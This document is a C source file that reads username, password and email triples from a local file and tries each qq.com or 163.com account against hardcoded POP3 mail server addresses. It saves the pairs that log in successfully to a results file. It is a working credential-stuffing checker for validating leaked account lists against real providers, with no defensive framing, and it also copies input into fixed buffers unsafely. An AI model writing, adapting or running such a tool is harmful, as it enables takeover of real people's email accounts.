#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <poll.h>

int validate_email(char * server_addr, char * user_email, char * user_passwd);
void quit(int sockfd);

int main()
{
	FILE * fp;
	FILE * fp2;

	char * line = NULL;
	
	char user_name[32];
	char user_passwd[32];
	char user_email[32];

	char result_buf[256];

	fp = fopen("account.data", "r");
	if(fp == NULL)
	{
		printf("failed to open the data file \n");
		exit(-1);
	}

	fp2 = fopen("result.data", "w+");
	if(fp2 == NULL)
	{
		printf("failed to open the result file \n");
		exit(-1);
	}

	ssize_t read;
	size_t len = 0;
	char * token = NULL;
	int i = 0;
	int flag = 0;

	while(( read = getline(&line, &len, fp)) != -1)
	{
		i++;
		token = strtok(line, " \t#\n");
		
		if(token != NULL)
		{
			strcpy(user_name, token);
			token = strtok(NULL, " \t#\r\n");
		}
		if(token != NULL)
		{
			strcpy(user_passwd, token);
			token = strtok(NULL, " \t#\r\n");
		}
		if(token != NULL)
		{
			strcpy(user_email, token);
			flag = 1;
		}

		if(flag)
		{
			if(strstr(user_email, "@qq.com") != NULL)
			{
				printf("QQ: user_email=%s  user_passwd=%s\n", user_email, user_passwd);
				if(validate_email("113.108.16.116", user_email, user_passwd))
				{
					printf("Validate OK\n");

					sprintf(result_buf, "%s %s\n", user_email, user_passwd);
					fputs(result_buf, fp2);
					fflush(fp2);
				}
				else
				{
					printf("Validate ERR\n");
				}
			}
			else if(strstr(user_email, "@163.com") != NULL)
			{
				printf("163: user_email=%s  user_passwd=%s\n", user_email, user_passwd);
				if(validate_email("123.125.50.29", user_email, user_passwd))
				{
					printf("Validate OK\n");

					sprintf(result_buf, "%s %s\n", user_email, user_passwd);
					fputs(result_buf, fp2);
					fflush(fp2);
				}
				else
				{
					printf("Validate ERR\n");
				}
			}
		}
	}	
}


int validate_email(char * server_addr, char * user_email, char * user_passwd)
{
	int sockfd;
	int poll_result;
	char wbuf[128];
	char rbuf[256];
	int rsize;

	if((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
	{
		return 0;
	}

	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(110);
	addr.sin_addr.s_addr = inet_addr(server_addr);

	if(connect(sockfd, (struct sockaddr*)&addr, sizeof(struct sockaddr)) == -1)
	{
		return 0;
	}
	rsize = read(sockfd, rbuf, 256);
	rbuf[rsize] = '\0';
	printf("[1] rsize=%d: %s\n", rsize, rbuf);

	sprintf(wbuf, "user %s\r\n", user_email);
	if(write(sockfd, wbuf, strlen(wbuf)) <=0)
	{
		quit(sockfd);
		return 0;
	}

	struct pollfd pfd[1];
	pfd[0].fd = sockfd;
	pfd[0].events = POLLIN;

	poll_result = poll(pfd, 1, 1000);
	if(poll_result <= 0)
	{
		quit(sockfd);
		return 0;
	}
	if(pfd[0].revents & POLLIN)
	{
		if((rsize = read(sockfd, rbuf, 127)) <= 0) 
		{
			quit(sockfd);
			return 0;
		}

		rbuf[rsize] = '\0';
		printf("[2] rsize=%d: %s\n", rsize, rbuf);
		if(strncmp(rbuf, "+OK", 3) != 0) 
		{
			quit(sockfd);
			return 0;
		}
	}

	 
	sprintf(wbuf, "pass %s\r\n", user_passwd);
	if(write(sockfd, wbuf, strlen(wbuf)) <=0) 
	{
		quit(sockfd);
		return 0;
	}

	poll_result = poll(pfd, 1, 1000);
	if(poll_result <= 0)
	{
		quit(sockfd);
		return 0;
	}
	if(pfd[0].revents & POLLIN)
	{
		if((rsize = read(sockfd, rbuf, 127)) <= 0) 
		{
			quit(sockfd);
			return 0;
		}

		rbuf[rsize] = '\0';
		printf("[3] rsize=%d: %s\n", rsize, rbuf);
		if(strncmp(rbuf, "+OK", 3) != 0) 
		{
			quit(sockfd);
			return 0;
		}

		quit(sockfd);
		return 1;
	}
	return 0;
}



void quit(int sockfd)
{
	char wbuf[128];
	strcpy(wbuf, "quit\r\n");
	write(sockfd, wbuf, strlen(wbuf));

	close(sockfd);
}

